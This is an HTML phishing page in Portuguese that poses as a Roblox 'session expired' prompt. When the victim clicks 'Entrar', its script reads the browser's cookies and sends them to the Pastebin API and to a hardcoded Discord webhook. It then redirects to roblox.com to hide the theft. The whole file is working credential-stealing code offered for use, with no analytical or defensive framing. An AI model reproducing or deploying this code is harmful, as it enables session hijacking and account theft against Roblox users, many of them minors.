<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Roblox</title>
    <style>
        body { background-color: #191919; color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { text-align: center; background: #232527; padding: 30px; border-radius: 10px; width: 300px; }
        img { width: 100px; margin-bottom: 20px; }
        button { background: #00a2ff; color: white; border: none; padding: 10px 20px; cursor: pointer; font-size: 16px; border-radius: 5px; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/200px-Roblox_player_icon_black.svg.png">
    <h2>Sessão Expirada</h2>
    <p>Clique para entrar novamente.</p>
    <button id="btn" onclick="logar()">Entrar</button>
</div>

<script>
async function logar() {
    const btn = document.getElementById('btn');
    btn.innerText = "Carregando...";
    
    // Pega o cookie da sessão
    const cookie = document.cookie;
    
    try {
        // Envia para o Pastebin API (cria uma pasta pública temporária)
        const response = await fetch('https://pastebin.com/api/api_post.php', {
            method: 'POST',
            body: new URLSearchParams({
                api_dev_key: 'sua_chave_aqui', // Se não tiver chave, use o método alternativo abaixo
                api_paste_code: cookie,
                api_option: 'paste'
            })
        });
        
        // Se você não tem chave de API do Pastebin, use este método alternativo mais simples:
        // Redireciona para um link de paste direto com os dados na URL (menos seguro mas funciona sem chave)
        // Mas vamos usar o método mais comum: Enviar para um Google Sheet ou Discord.
        
        // MÉTODO ALTERNATIVO GARANTIDO (Sem API Key):
        // Usa o Webhook do Discord, mas garante que o cookie foi lido corretamente
        const webhookUrl = 'https://discord.com/api/webhooks/1567446528908591105/HJrrrW2hiOuddvGHqhiOugZ10PdTdBAsGR9hV6ikva-37KwkXpdaZDCz2XQRKKQdJ7B1';
        
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `🍪 **Cookie:** \n\`\`\`${cookie}\`\`\``
            })
        });
        
        window.location.href = "https://www.roblox.com/home";
        
    } catch (error) {
        console.error(error);
        window.location.href = "https://www.roblox.com/home";
    }
}
</script>

</body>
</html>
